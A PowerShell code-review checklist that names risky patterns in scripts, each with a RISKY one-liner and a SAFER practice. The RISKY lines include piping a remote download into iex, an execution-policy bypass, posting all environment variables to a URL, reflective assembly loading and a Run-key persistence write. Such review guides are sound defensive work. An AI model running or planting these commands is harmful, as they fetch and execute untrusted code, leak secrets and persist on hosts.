## PowerShell Review Criteria
- Invoke-Expression on external data: Note iex/Invoke-Expression fed by downloads, parameters, or decoded strings. RISKY: iwr https://x.ps1 | iex  SAFER: download to file, verify hash, then run the reviewed file
- Encoded commands: Note -EncodedCommand, [Convert]::FromBase64String(...) piped toward execution. RISKY: powershell -enc JAB...  SAFER: plain-text committed scripts (flag presence; do not decode)
- Policy bypass: Note Set-ExecutionPolicy Bypass, -ExecutionPolicy Bypass, or unblocking downloaded files. RISKY: powershell -ep bypass -f tool.ps1  SAFER: no policy changes
- Env-to-network flow: Note Get-ChildItem env: or $env:TOKEN passed to Invoke-RestMethod/Invoke-WebRequest bodies or headers to new hosts. RISKY: irm $u -Method Post -Body (gci env: | Out-String)  SAFER: env used only for documented config
- In-memory assembly loading: Note Add-Type with large inline C#, or [Reflection.Assembly]::Load(...) on byte arrays. RISKY: [Reflection.Assembly]::Load($bytes)  SAFER: no reflective loading
- Persistence writes: Note writes to $PROFILE, scheduled tasks (Register-ScheduledTask, schtasks), or Run registry keys. RISKY: Set-ItemProperty HKCU:\...\Run -Name u -Value cmd  SAFER: no persistence mechanisms in CI scripts
- Download-then-run: Note DownloadFile/DownloadString/Start-BitsTransfer followed by execution of the result. RISKY: (New-Object Net.WebClient).DownloadString($u) | iex  SAFER: pinned download + hash check
